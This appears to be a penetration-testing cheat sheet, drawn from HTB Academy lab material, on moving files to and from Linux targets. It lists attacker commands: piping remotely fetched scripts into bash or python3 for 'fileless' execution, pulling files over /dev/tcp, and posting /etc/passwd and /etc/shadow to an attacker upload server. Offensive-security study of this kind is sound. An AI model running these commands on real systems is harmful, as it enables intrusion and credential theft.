# Linux

## Download

### Copy\&Paste

This works by encoding the file as base64 and copying it to the destination and decode the string back to file. This might come in handy.

**Linux - encode to base64**

```shell-session
kali@kali $ cat <file> |base64 -w 0;echo
```

**Linux - decode 64**

```shell-session
kali@kali $ echo <base64 contents> | base64 -d > hosts
```

**Linux - check hash**

```shell-session
kali@kali $ md5sum <file>
```

### Web Download (Wget\&cURL)

**Linux - wget**

```shell-session
kali@kali $ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

**Linux - curl**

<pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali $ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
</strong></code></pre>

### Fileless attack (in Linux)

Pipe the command without outputting to excecuter

**Linux - fileless attack with curl**

<pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali $ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
</strong></code></pre>

**Linux - fileless attack with curl**

```shell-session
kali@kali $ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

### Bash (/dev/tcp)

> Only works if the Bash version is >= 2.04, This version of /dev/tcp can be use to perform simple file transfer.

Following are the series of commands that performs a file download (assuming the attackers' machine is running a webserver.

```shell-session
kali@kali $ exec 3<>/dev/tcp/10.10.10.32/80 # Connects to attack machine
kali@kali $ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3 # Performs GET request
kali@kali $ cat <&3 # Print the response
```

### **SSH (File transfer)**

First check for the SSH listening port

```shell-session
kali@kali $ netstat -lnpt
```

**Linux - Downloading Files Using SCP**

```shell-session
kali@kali $ scp <user>@192.168.49.128:/root/myroot.txt . 
```

> Create a temporary user to avoid using primary credentials or keys on a remote computer

## Upload

### Web Upload (uploadserver.py)

On the **attacker**'s machine, create a  certificate (below is self-signed cer) then create upload server using Python3's `uploadserver` module.

**Linux - Create a Self-Signed Certificate**

```shell-session
kali@kali $ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

```shell-session
kali@kali $ mkdir https && cd https
kali@kali $ python3 -m uploadserver 443 --server-certificate /root/server.pem
```

**Linux - Upload Multiple Files**

```shell-session
kali@kali $ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Web Upload (Python server)

**Linux - Create Python3 HTTP server**

```shell-session
kali@kali $ python3 -m http.server <port> # port is optional
```

**Linux - Create Python2.7 HTTP server**

```shell-session
kali@kali $ python2.7 -m SimpleHTTPServer <port> # port is optional
```

### Web Upload (Other HTTP servers)

**Linux - Create PHP HTTP server**

<pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali $ php -S 0.0.0.0:8000
</strong></code></pre>

**Linux - Create Ruby HTTP server**

```shell-session
kali@kali $ ruby -run -ehttpd . -p8000
```

### Downloading files from above **HTTP** servers

```shell-session
kali@kali $ wget 192.168.49.128:8000/filetotransfer.txt
```

### SCP Upload

```shell-session
kali@kali $ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/

plaintext@192.168.49.128's password: 
```

## Resources

Most of the commands and contents are from **HTB academy lab!**
